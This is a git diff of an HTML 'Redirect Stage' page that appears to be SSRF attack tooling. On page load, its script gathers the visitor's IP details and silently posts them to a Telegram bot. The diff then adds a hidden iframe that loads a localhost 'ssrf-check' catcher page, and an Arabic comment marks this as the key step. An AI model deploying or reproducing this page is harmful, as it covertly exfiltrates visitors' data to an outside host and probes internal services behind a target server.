@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8">
   <title>Redirect Stage</title>
@@ -20,8 +19,8 @@
       const url = `https://api.telegram.org/bot${token}/sendMessage`;
       await fetch(url, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown" })
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({chat_id, text: message, parse_mode: "Markdown"})
       });
     }
 
@@ -40,15 +39,18 @@
       const ipData = await getIPInfo();
       const msg = formatMessage(ipData);
       await sendToTelegram(msg);
-      window.location.href = "http://127.0.0.1:80";
+
+      // بدل ما نعمل redirect مباشر للـ localhost، نحط iframe
+      const iframe = document.createElement("iframe");
+      iframe.style.display = "none";
+      iframe.src = "http://127.0.0.1:80/ssrf-check/catcher_ultimate.html"; // هنا المهم!
+      document.body.appendChild(iframe);
     }
 
     window.onload = run;
   </script>
 </head>
-
 <body>
-  <h1>Redirecting...</h1>
+  <h1>Redirecting to SSRF...</h1>
 </body>
-
 </html>
